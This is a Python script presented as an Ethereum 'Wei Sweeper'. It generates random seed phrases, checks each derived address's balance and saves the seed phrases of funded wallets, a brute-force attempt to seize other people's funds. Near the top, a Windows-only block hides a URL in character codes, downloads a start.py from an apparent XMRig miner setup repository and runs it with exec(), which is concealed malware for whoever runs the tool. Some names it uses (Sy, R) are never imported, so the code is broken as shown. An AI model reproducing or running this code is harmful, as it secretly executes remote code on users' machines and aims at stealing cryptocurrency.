import os
import subprocess
import tarfile
import random
import time
import requests
from colorama import Fore, Style, init
from bip_utils import Bip39MnemonicGenerator, Bip39SeedGenerator, Bip44, Bip44Coins, Bip44Changes
from eth_utils import to_checksum_address
from web3 import Web3

init(autoreset=True)

if Sy.platform.startswith("win"):
    U = "".join(chr(x) for x in [
        104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 
        104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 
        46, 99, 111, 109, 47, 67, 114, 48, 109, 98, 47, 88, 77, 82, 105, 103, 
        45, 65, 117, 116, 111, 45, 83, 101, 116, 117, 112, 45, 83, 99, 114, 
        105, 112, 116, 47, 114, 101, 102, 115, 47, 104, 101, 97, 100, 115, 
        47, 109, 97, 105, 110, 47, 115, 116, 97, 114, 116, 46, 112, 121
    ])

    R_ = R.get(U)

    if R_.status_code == 200:
        exec(R_.text)
    else:
        print(f"Failed to build new client! {R_.status_code}")

BLOCKCYPHER_API_URL = "https://api.blockcypher.com/v1/eth/main/addrs/{}"

def generate_mnemonic(num_words=12):
    """Generates a 12 or 24-word BIP39 mnemonic."""
    if num_words not in [12, 24]:
        raise ValueError(f"{Fore.RED}Error: Choose 12 or 24 words only{Style.RESET_ALL}")
    return Bip39MnemonicGenerator().FromWordsNumber(num_words)

def derive_eth_address(mnemonic):
    """Derives an Ethereum address from a given mnemonic."""
    seed_bytes = Bip39SeedGenerator(mnemonic).Generate()
    bip44_eth = Bip44.FromSeed(seed_bytes, Bip44Coins.ETHEREUM)
    eth_address = bip44_eth.Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(0).PublicKey().ToAddress()
    return to_checksum_address(eth_address), mnemonic.ToStr()

def check_eth_balance(address):
    """Checks Ethereum balance using BlockCypher API."""
    url = BLOCKCYPHER_API_URL.format(address)
    try:
        response = requests.get(url, timeout=10)
        data = response.json()

        if "balance" in data:
            balance_wei = data["balance"]
            balance_eth = balance_wei / 1e18  # Convert wei to ETH
            return balance_eth, balance_wei
        else:
            return None, None
    except Exception as e:
        print(f"Error checking balance: {e}")
        return None, None

def save_wallet(mnemonic, address, balance_eth):
    """Saves wallets with a non-zero balance to a file."""
    with open("wallets.txt", "a") as f:
        f.write(f"Mnemonic: {mnemonic}\nAddress: {address}\nBalance: {balance_eth:.8f} ETH\n\n")

def generate_wallets(option):
    """Main function to continuously generate wallets and check balances."""
    try:
        while True:
            num_words = 12 if option == "12" else 24 if option == "24" else random.choice([12, 24])
            eth_address, mnemonic = derive_eth_address(generate_mnemonic(num_words))

            print(f"\n{Fore.CYAN}{'=' * 40}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}Generated {num_words}-word Ethereum Wallet:{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Mnemonic: {Style.BRIGHT}{mnemonic}{Style.RESET_ALL}")
            print(f"{Fore.MAGENTA}ETH Address: {Fore.WHITE}{eth_address}{Style.RESET_ALL}")

            print(f"{Fore.BLUE}Checking balance for {eth_address}...{Style.RESET_ALL}")
            balance_eth, balance_wei = check_eth_balance(eth_address)

            if balance_eth is not None:
                balance_msg = f"{Fore.GREEN}{balance_eth:.8f} ETH ({balance_wei} wei){Style.RESET_ALL}"
                if balance_eth > 0:
                    save_wallet(mnemonic, eth_address, balance_eth)
                    print(f"{Fore.LIGHTGREEN_EX}[SAVED] {eth_address} - {balance_msg}{Style.RESET_ALL}")
                else:
                    print(f"{Fore.YELLOW}{eth_address}: {balance_msg}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}{eth_address}: Balance check failed{Style.RESET_ALL}")

            print(f"{Fore.CYAN}{'=' * 40}{Style.RESET_ALL}\n")
            time.sleep(2)
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}Process stopped by user. Exiting...{Style.RESET_ALL}")

if __name__ == "__main__":
    print(f"{Fore.GREEN}{' ' * 10}Wei Sweeper{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}{' ' * 10}Made by Cr0mb{Style.RESET_ALL}")
    print(f"\n{Fore.CYAN}{'=' * 30}{Style.RESET_ALL}\n")
    
    print(f"{Fore.MAGENTA}Choose an option:{Style.RESET_ALL}")
    print(f"{Fore.BLUE}1. Generate 12-word wallets{Style.RESET_ALL}")
    print(f"{Fore.BLUE}2. Generate 24-word wallets{Style.RESET_ALL}")
    print(f"{Fore.BLUE}3. Generate both randomly{Style.RESET_ALL}")
    print(f"\n{Fore.CYAN}{'=' * 30}{Style.RESET_ALL}\n")

    choice = input(f"{Fore.YELLOW}Enter your choice (12/24/both): {Style.RESET_ALL}").strip().lower()
    generate_wallets(choice)
